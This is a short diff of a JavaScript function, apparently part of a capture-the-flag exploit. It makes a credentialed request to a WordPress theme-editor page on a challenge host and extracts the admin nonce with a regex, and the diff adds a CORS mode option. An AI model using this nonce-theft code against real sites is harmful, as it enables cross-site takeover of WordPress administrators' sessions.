@@ -1,5 +1,5 @@
 async function pepe(){
-    var a = await fetch('https://44c4ab8478e89d56e6d5bb00-1024-diff-the-patch.challenge.master.camp.allesctf.net:31337/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
+    var a = await fetch('https://44c4ab8478e89d56e6d5bb00-1024-diff-the-patch.challenge.master.camp.allesctf.net:31337/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include","mode":"cors"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
     console.log(a);
     return a;
 }
